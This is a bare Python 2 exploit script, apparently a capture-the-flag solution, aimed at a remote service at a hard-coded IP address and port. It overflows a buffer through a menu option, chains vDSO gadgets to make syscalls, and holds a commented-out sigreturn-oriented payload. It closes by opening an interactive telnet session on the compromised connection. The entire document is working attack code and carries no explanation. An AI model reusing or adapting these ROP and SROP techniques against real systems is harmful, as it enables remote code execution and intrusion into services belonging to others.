import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def overflow(f, payload):
	read_menu(f)
	f.write('4\n')
	readuntil(f, 'code execution\n')
	f.write(payload)

def read_menu(f):
	readuntil(f, '0. Quit\n')

host = '192.168.165.134'
host = '202.120.7.110'
port = 2000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

vdso_base = 0xf7ffb000
sigreturn = vdso_base + 0xd41
print hex(sigreturn)

raw_input('wait')

int80_ebp_edx_ecx_ret = 0xf7ffd42e
edx_ecx_ret = 0xf7ffd431
random_buf = 0xf7ffc000

payload = ''
payload += 'A' * 14
payload += p(0) # fd 
payload += 'A' * 4
payload += p(edx_ecx_ret) 
payload += p(64) # edx -> len
payload += p(random_buf) # ecx -> addr
payload += p(int80_ebp_edx_ecx_ret)
payload = payload.ljust(100, 'A')
#payload = 'A'
read_menu(f)
f.write('4\n')
readuntil(f, 'code execution\n')

payload = 'A' * 100
from time import sleep
syscall_num = 3
f.write(payload[:100 - syscall_num])
time.sleep(0.5)
f.write(payload[100 - syscall_num:])

random_text = f.read(64) 


'''
payload = 'A' * (0x1a - 0x4)
payload += p(sigreturn)
payload += p(0x2b) * 3
payload += p(0)
payload += p(1) # edi
payload += p(2) # esi
payload += p(3) # ebp
payload += p(4) # esp
payload += p(5) # ebx
payload += p(6) # edx
payload += p(7) # ecx
payload += p(8) # eax
payload += p(10) # thread
payload += p(11)
payload += p(0x47474747) # eip
payload += '\x23\x00'
payload = payload.ljust(100, '\x00')
#print len(payload)
'''

#overflow(f, payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
